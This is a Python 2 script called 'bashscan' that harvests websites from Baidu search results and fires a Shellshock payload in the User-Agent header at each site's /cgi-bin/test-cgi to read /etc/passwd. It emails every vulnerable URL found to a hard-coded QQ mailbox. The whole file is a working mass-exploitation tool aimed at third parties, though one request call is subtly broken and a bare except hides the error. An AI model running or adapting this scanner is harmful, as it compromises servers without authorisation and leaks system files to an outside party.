#coding=utf-8
import smtplib
from email.mime.text import MIMEText
import urlparse, copy, urllib
import urllib2
import requests
import sys
import re

headerst = {
    'User-Agent': '() { foo;};echo;/bin/cat /etc/passwd'
}

def email(url):
    _user = "1132227302@qq.com"
    _pwd  = "密码"
    _to   = "1132227302@qq.com"

    msg = MIMEText(url)
    msg["Subject"] = u"漏洞来了"
    msg["From"]    = _user
    msg["To"]      = _to

    try:
        s = smtplib.SMTP_SSL("smtp.qq.com", 465)
        s.login(_user, _pwd)
        s.sendmail(_user, _to, msg.as_string())
        s.quit()
        print "Success!"
    except smtplib.SMTPException,e:
        print "Falied,%s"%e

def baiduurl(text):
	for urls in range(80):
		try:
			url="http://www.baidu.com/s?wd="+text+"&pn="+str(urls)+"0"
			url_t=urllib2.urlopen(url)
			urlt=url_t.read()
			url_text=r'<a target="_blank" href="(.+)" class="c-showurl" style="text-decoration:none;">'
			url_re=re.compile(url_text)
			url_ret=re.findall(url_re,urlt)
			for url_res in url_ret:
				r = requests.get(url_res)
				title=r.url
				title_u=re.compile(r'http://.*?/')
				title_s=re.findall(title_u, title)
				for titless in title_s:
					titles_s=str(titless)+"/cgi-bin/test-cgi"
					print titles_s
					urlsts=urllib2.Request(titles_s,headerst=headerst)
					urlst=urllib2.urlopen(urlsts)
					urlst_t=urlst.read()
					titless_u=re.compile(r'x:0:0:root:/root:')
					titless_us=re.findall(titless_u, urlst_t)
					for title_users in titless_us:
						email(str(titles_s)+":"+title_users)
						print str(titles_s)+":"+title_users
		except:
			pass

if __name__ == '__main__':
	helps=u"""
			bashscan
			作者：沦沦
	使用说明：python bashscan.py -u 文件.txt			
		"""
	if len(sys.argv)<2:
		print helps
	else:
		if len(sys.argv)>2:
			if sys.argv[1]=='-u':
				text=sys.argv[2]
				baiduurl(text)
		else:
			print helps
